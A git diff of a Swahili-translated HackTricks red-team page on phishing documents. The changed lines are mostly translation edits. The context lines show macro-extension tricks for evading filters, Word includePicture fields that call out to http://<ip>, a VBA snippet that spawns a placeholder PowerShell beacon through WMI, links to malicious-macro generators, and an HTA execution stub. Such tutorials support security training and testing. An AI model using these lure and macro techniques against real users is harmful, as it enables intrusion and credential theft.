@@ -1,15 +1,15 @@
 # Phishing Files & Documents
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
 * Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
@@ -19,11 +19,11 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 Microsoft Word inafanya uthibitisho wa data za faili kabla ya kufungua faili. Uthibitisho wa data unafanywa kwa njia ya utambuzi wa muundo wa data, dhidi ya kiwango cha OfficeOpenXML. Ikiwa hitilafu yoyote itatokea wakati wa utambuzi wa muundo wa data, faili inayochambuliwa haitafunguliwa.
 
-Kawaida, faili za Word zinazokuwa na macros hutumia kiambishi cha `.docm`. Hata hivyo, inawezekana kubadilisha jina la faili kwa kubadilisha kiambishi cha faili na bado kuweka uwezo wao wa kutekeleza macros.\
-Kwa mfano, faili ya RTF haisaidii macros, kwa muundo, lakini faili ya DOCM iliyobadilishwa kuwa RTF itashughulikiwa na Microsoft Word na itakuwa na uwezo wa kutekeleza macros.\
-Mifumo na mitambo sawa inatumika kwa programu zote za Microsoft Office Suite (Excel, PowerPoint, nk.).
+Kawaida, faili za Word zinazokuwa na macros hutumia kiambishi cha `.docm`. Hata hivyo, inawezekana kubadilisha jina la faili kwa kubadilisha kiambishi cha faili na bado kuhifadhi uwezo wao wa kutekeleza macros.\
+Kwa mfano, faili ya RTF haisaidii macros, kwa muundo, lakini faili ya DOCM iliyobadilishwa jina kuwa RTF itashughulikiwa na Microsoft Word na itakuwa na uwezo wa kutekeleza macros.\
+Mifumo na mitambo sawa inatumika kwa programu zote za Microsoft Office Suite (Excel, PowerPoint n.k.).
 
-Unaweza kutumia amri ifuatayo kuangalia ni viambishi gani vitakavyotekelezwa na baadhi ya programu za Office:
+Unaweza kutumia amri ifuatayo kuangalia ni kiambishi gani kitakachotekelezwa na baadhi ya programu za Office:
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
@@ -32,7 +32,7 @@ DOCX files referencing a remote template (File –Options –Add-ins –Manage: 
 ### External Image Load
 
 Go to: _Insert --> Quick Parts --> Field_\
-_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://\<ip>/whatever
+&#xNAN;_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://\<ip>/whatever
 
 ![](<../../.gitbook/assets/image (155).png>)
 
@@ -77,26 +77,26 @@ Dim proc As Object
 Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
 proc.Create "powershell <beacon line generated>
 ```
-#### Ondoa metadata kwa mikono
+#### Manually remove metadata
 
-Nenda kwenye **File > Info > Inspect Document > Inspect Document**, ambayo itafungua Document Inspector. Bonyeza **Inspect** kisha **Remove All** kando ya **Document Properties and Personal Information**.
+Nenda kwa **File > Info > Inspect Document > Inspect Document**, ambayo itafungua Document Inspector. Bonyeza **Inspect** kisha **Remove All** kando ya **Document Properties and Personal Information**.
 
-#### Upanuzi wa Doc
+#### Doc Extension
 
 Unapomaliza, chagua **Save as type** dropdown, badilisha muundo kutoka **`.docx`** hadi **Word 97-2003 `.doc`**.\
-Fanya hivi kwa sababu huwezi **kuhifadhi macro's ndani ya `.docx`** na kuna **stigma** **kuhusu** upanuzi wa macro-enabled **`.docm`** (kwa mfano, ikoni ya thumbnail ina `!` kubwa na baadhi ya lango la wavuti/barua pepe linaweza kuzizuia kabisa). Hivyo, upanuzi huu wa zamani wa **`.doc`** ni suluhisho bora.
+Fanya hivi kwa sababu huwezi **kuhifadhi macro's ndani ya `.docx`** na kuna **stigma** **kuhusu** muundo wa macro-enabled **`.docm`** (kwa mfano, ikoni ya thumbnail ina `!` kubwa na baadhi ya lango la wavuti/barua pepe linazizuia kabisa). Hivyo, muundo huu wa zamani wa **`.doc`** ni suluhisho bora.
 
-#### Watengenezaji wa Macros Mbaya
+#### Malicious Macros Generators
 
 * MacOS
 * [**macphish**](https://github.com/cldrn/macphish)
 * [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
 
-## Faili za HTA
+## HTA Files
 
 HTA ni programu ya Windows ambayo **inaunganisha HTML na lugha za skripti (kama VBScript na JScript)**. Inaunda kiolesura cha mtumiaji na inatekelezwa kama programu "iliyokubaliwa kikamilifu", bila vizuizi vya mfano wa usalama wa kivinjari.
 
-HTA inatekelezwa kwa kutumia **`mshta.exe`**, ambayo kwa kawaida **imewekwa** pamoja na **Internet Explorer**, ikifanya **`mshta` kuwa tegemezi la IE**. Hivyo ikiwa imeondolewa, HTAs hazitaweza kutekelezwa.
+HTA inatekelezwa kwa kutumia **`mshta.exe`**, ambayo kwa kawaida **imewekwa** pamoja na **Internet Explorer**, ikifanya **`mshta` kuwa tegemezi kwa IE**. Hivyo ikiwa imeondolewa, HTAs hazitaweza kutekelezwa.
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -173,16 +173,16 @@ Usisahau kwamba huwezi tu kuiba hash au uthibitisho bali pia **fanya mashambuliz
 * [**AD CS ESC8 (NTLM relay kwa vyeti)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
 {% hint style="success" %}
-Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Jifunze na fanya mazoezi ya AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze na fanya mazoezi ya GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
 * Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
-* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
+* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 {% endhint %}
